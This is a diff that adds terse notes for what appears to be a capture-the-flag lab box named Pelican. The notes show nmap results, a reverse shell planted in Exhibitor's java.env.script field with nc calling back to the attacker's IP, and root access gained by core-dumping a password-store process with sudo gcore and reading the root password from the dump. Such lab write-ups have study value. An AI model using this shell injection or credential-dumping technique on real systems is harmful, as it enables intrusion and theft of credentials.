@@ -1,0 +1,33 @@
+2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
+8080/tcp  open  http        Jetty 1.0
+|_http-server-header: Jetty(1.0)
+|_http-title: Error 404 Not Found
+8081/tcp  open  http        nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to http://192.168.204.98:8080/exhibitor/v1/ui/index.html
+39605/tcp open  java-rmi    Java RMI
+Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+browser in 8081
+check field in Exhibitor->Config->java.env.script, change it
+export JAVA_OPTS="$(/bin/nc -e /bin/sh 192.168.45.217 4444 &)"
+
+sudo -l
+User charles may run the following commands on pelican:
+    (ALL) NOPASSWD: /usr/bin/gcore
+
+ps -auxw
+root       513  0.0  0.0   2276    72 ?        Ss   Apr16   0:00 /usr/bin/password-store
+
+pid = 513
+strings core.513
+Password: root:
+ClogKingpinInning731
+
+su root
+ClogKingpinInning731
+id
+uid=0(root) gid=0(root) groups=0(root)
+
